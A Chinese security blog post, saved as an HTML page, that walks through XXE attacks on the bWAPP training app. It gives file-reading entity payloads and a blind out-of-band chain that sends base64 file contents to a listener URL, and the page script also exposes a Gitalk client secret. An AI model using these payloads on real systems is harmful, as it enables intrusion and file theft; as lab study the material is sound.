@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：在学习 XXE 的时候无意间发现了这个环境于是就下了下来进行测试。  我们先来看看 low 等级第一种方法 点击Any bugs？然后burp进行抓包，在burp的repeat里进行测试！  为了测试任意文件读取，我在D盘下创建了一个test.txt文件，现在我们尝试读取到它的内容。 首先拿到包 post 传送的数据有&lt;reset&gt;&lt;login&gt;0&lt;&#x2F;login">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次bWAPP平台上 XXE">
+<meta property="og:url" content="https://mayi077.github.io/2020/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1bWAPP%E5%B9%B3%E5%8F%B0%E4%B8%8A-XXE/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言：在学习 XXE 的时候无意间发现了这个环境于是就下了下来进行测试。  我们先来看看 low 等级第一种方法 点击Any bugs？然后burp进行抓包，在burp的repeat里进行测试！  为了测试任意文件读取，我在D盘下创建了一个test.txt文件，现在我们尝试读取到它的内容。 首先拿到包 post 传送的数据有&lt;reset&gt;&lt;login&gt;0&lt;&#x2F;login">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e5d082698271cb2b8c96021.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e5d095698271cb2b8c9ebc7.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e5d0cb898271cb2b8cb9fcd.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e5d13ee98271cb2b8cee1bc.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e5f517198271cb2b8f1e34d.jpg">
+<meta property="article:published_time" content="2020-03-04T07:01:24.000Z">
+<meta property="article:modified_time" content="2020-03-04T07:06:39.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="基础积累">
+<meta property="article:tag" content="漏洞积累">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e5d082698271cb2b8c96021.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1bWAPP%E5%B9%B3%E5%8F%B0%E4%B8%8A-XXE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>记一次bWAPP平台上 XXE | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1bWAPP%E5%B9%B3%E5%8F%B0%E4%B8%8A-XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次bWAPP平台上 XXE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-04 15:01:24 / 修改时间：15:06:39" itemprop="dateCreated datePublished" datetime="2020-03-04T15:01:24+08:00">2020-03-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">基础积累</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>在学习 XXE 的时候无意间发现了这个环境于是就下了下来进行测试。 </p>
+<h3 id="我们先来看看-low-等级"><a href="#我们先来看看-low-等级" class="headerlink" title="我们先来看看 low 等级"></a>我们先来看看 low 等级</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><ol>
+<li>点击<code>Any bugs？</code>然后burp进行抓包，在burp的repeat里进行测试！<br><a href="https://pic.downk.cc/item/5e5d082698271cb2b8c96021.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e5d082698271cb2b8c96021.jpg" alt=""></a> </li>
+<li>为了测试任意文件读取，我在D盘下创建了一个<code>test.txt</code>文件，现在我们尝试读取到它的内容。</li>
+<li>首先拿到包 post 传送的数据有<code>&lt;reset&gt;&lt;login&gt;0&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code> 在看看他的<br><a href="https://pic.downk.cc/item/5e5d095698271cb2b8c9ebc7.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e5d095698271cb2b8c9ebc7.jpg" alt=""></a></li>
+<li>接下来我们构造一个实体让他访问我们的文件内容，这里我们利用<code>file:///</code>协议注意一般都是3个斜杠。构造的内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#这应该是最简形式了，当然如果不成功可以试试 将SYSTEM后面的一串直接换成字符串看是否可以解析xml</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a[   </span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot; &gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;name;&lt;&#x2F;login&gt;&lt;secret&gt;Any bugs?&lt;&#x2F;secret&gt;&lt;&#x2F;reset&gt;</span><br><span class="line"></span><br><span class="line">#上面的a可以替换为任意标识符</span><br><span class="line">#有时候需要加&lt;!ELEMENT a ANY &gt; 设置标签的属性</span><br></pre></td></tr></table></figure></li>
+<li>但是使用 file 协议有时候无法正确读取出文件甚至是报错，因为编码或者特殊符号的原因，那么这个时候我们想到了 <code>php://filter/read=convert.base64-encode/resource=文件名</code>它可以得到文件的base64编码，我们得到后去解码即可！记得windows下 d:/ 不用在前面加 /d:/ 了<br><a href="https://pic.downk.cc/item/5e5d0cb898271cb2b8cb9fcd.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e5d0cb898271cb2b8cb9fcd.jpg" alt=""></a></li>
+<li>值得注意的是，声明实体的语句为<code>&lt;!ENTITY  实体名称  &quot;实体的值&quot;&gt;</code> 引用实体的方法为 <code>&amp;实体名称;</code> 后面有个分号！</li>
+</ol>
+<h4 id="换一种方法"><a href="#换一种方法" class="headerlink" title="换一种方法"></a>换一种方法</h4><p>前面还是老样子咯，换一下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">插入的代码</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;mayi.dtd&quot; &gt; %xxe;]</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;name;&lt;&#x2F;login&gt;&lt;secret&gt;Any bugs?&lt;&#x2F;secret&gt;&lt;&#x2F;reset&gt;</span><br><span class="line">---------------------</span><br><span class="line">mayi.dtd 内容</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot; &gt;</span><br><span class="line"></span><br><span class="line">~</span><br></pre></td></tr></table></figure>
+<p>值的注意的是插入的时候在哪里调用%xxe,是在！DOCTYPE 这个标签里面。还有定义的时候 %  变量名 后面有个空格是必须加的。<br><a href="https://pic.downk.cc/item/5e5d13ee98271cb2b8cee1bc.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e5d13ee98271cb2b8cee1bc.jpg" alt=""></a>     </p>
+<p><strong>low</strong> 等级的就记这么多吧，明天再做其它级别的！  </p>
+<h3 id="再来看看-medium-High-等级"><a href="#再来看看-medium-High-等级" class="headerlink" title="再来看看 medium\High 等级"></a>再来看看 medium\High 等级</h3><p>&emsp; 经过对源代码的审计发现，medium和high是一样的，他们都是需要无回显的XXE利用。 </p>
+<h4 id="先在本地测试"><a href="#先在本地测试" class="headerlink" title="先在本地测试"></a>先在本地测试</h4><ol>
+<li>本地创建一个 XXE.php 内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">&lt;!DOCTYPE ANY[ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;d:&#x2F;test.txt&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;test.xml&quot;&gt; </span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;a1&gt;mayi077&lt;&#x2F;a1&gt; </span><br><span class="line">EOF;</span><br><span class="line">$data &#x3D; simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二行 EOF 后面不能有空格 ，具体自行可百度的到。</span><br><span class="line">&#x2F;&#x2F; simplexml_load_string($xml); 相当于进行了一次编译</span><br></pre></td></tr></table></figure></li>
+<li>本地再创建一个文件 test.xml 内容为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;%file;&#39;&gt; &quot;&gt;  </span><br><span class="line">&#x2F;&#x2F;用来进行内容的返回，也可直接侦听该端口</span><br></pre></td></tr></table></figure></li>
+<li>本地再创建一个 test.php 内容为 ：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file_put_contents(&quot;test.txt&quot;,$_GET[&#39;file&#39;],FILE_APPEND);</span><br><span class="line">?&gt;  </span><br><span class="line">&#x2F;&#x2F; 表示以追加形式给文件写入读到的数据</span><br></pre></td></tr></table></figure></li>
+<li>准备工作做好了，接着我们试试自己浏览器访问我们的 XXE.php 看是否可以正常些写入数据 。</li>
+</ol>
+<h4 id="放到题目来"><a href="#放到题目来" class="headerlink" title="放到题目来"></a>放到题目来</h4><p>我们只需要让它访问我们的那个链接就好 。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote  SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;XXE.php&quot; &gt; %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;bee222&lt;&#x2F;login&gt;&lt;secret&gt;Any bugs?&lt;&#x2F;secret&gt;&lt;&#x2F;reset&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 虽然报了错但是我们还是成功了<br> <a href="https://pic.downk.cc/item/5e5f517198271cb2b8f1e34d.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e5f517198271cb2b8f1e34d.jpg" alt=""></a><br> 报错内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  simplexml_load_string(): http:&#x2F;&#x2F;127.0.0.1&#x2F;XXE.php:1: parser error : internal error in &lt;b&gt;D:\phpstudy\WWW\bWAPP_latest\bWAPP\xxe-2.php&lt;&#x2F;b&gt; on line &lt;b&gt;79&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>值得注意的是，phpstudy 版本不要调太高，过高会自动修复了这个漏洞导致我们无法进行。     </p>
+<p>好啦就这么多了，源码的分析不难就不记录了!</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1bWAPP%E5%B9%B3%E5%8F%B0%E4%B8%8A-XXE/" title="记一次bWAPP平台上 XXE">https://mayi077.github.io/2020/03/04/记一次bWAPP平台上-XXE/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>漏洞积累</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/02/%E5%88%9D%E8%AF%86-XXE-%E6%BC%8F%E6%B4%9E/" rel="prev" title="初识 XXE 漏洞">
+      <i class="fa fa-chevron-left"></i> 初识 XXE 漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" rel="next" title="备份文件">
+      备份文件 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#我们先来看看-low-等级"><span class="nav-number">2.</span> <span class="nav-text">我们先来看看 low 等级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一种方法"><span class="nav-number">2.1.</span> <span class="nav-text">第一种方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#换一种方法"><span class="nav-number">2.2.</span> <span class="nav-text">换一种方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再来看看-medium-High-等级"><span class="nav-number">3.</span> <span class="nav-text">再来看看 medium\High 等级</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#先在本地测试"><span class="nav-number">3.1.</span> <span class="nav-text">先在本地测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#放到题目来"><span class="nav-number">3.2.</span> <span class="nav-text">放到题目来</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'a29315f19316fe6eb84cb731115e0c2c',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
